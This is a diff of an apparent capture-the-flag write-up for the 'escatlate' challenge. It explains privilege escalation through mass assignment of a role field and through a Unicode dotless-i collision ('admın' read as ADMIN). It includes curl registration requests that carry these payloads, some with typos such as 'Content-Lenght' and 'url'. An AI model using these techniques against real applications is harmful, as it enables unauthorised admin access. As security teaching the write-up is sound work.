@@ -8,7 +8,7 @@
 
 Logging in to the cat site automatically gets the `user role`, it allows you to browse the cat site and post comments. However, the application has a vulnerability: Mass Assignment. This means that the role assignment is not checked and the user can change it.That is, by providing a session token we are able to overwrite our role. Read more [here](https://tcm-sec.com/exploiting-mass-assignment-vulnerabilities/)
 
-###example solution
+### example solution
 
 ```bash 
 curl --path-as-is -i -s -k -X $'POST' -H '$HOST: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Im.catthesecond' -H'Content-Type: application/json' -H $'Content-Lenght: 53' --data-binary $'{\"username\":\"fw\",\"password\":\"test\",\"role\":\"MODERATOR\"}' $'https://escatlate-52bc47e034fa.1753ctf.com/api/register'
@@ -29,7 +29,7 @@ curl --path-as-is -i -s -k -X $'GET' \
 
 However, with the second flag, i.e. changing the role from `user` to `admin`, the application has a dotless vulnerability. When you specify a new role as `admın`, Unicode case collisions happen and it is read as `ADMIN`. More information [here](https://dev.to/jagracey/hacking-github-s-auth-with-unicode-s-turkish-dotless-i-460n)
 
-###example solution
+### example solution
 ```bash 
 
 url --path-as-is -i -s -k -X $'POST' -H '$HOST: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Im.cat' -H'Content-Type: application/json' -H $'Content-Lenght: 53' --data-binary $'{\"username\":\"fw\",\"password\":\"sus\",\"role\":\"admın\"}' $'https://escatlate-52bc47e034fa.1753ctf.com/api/register'
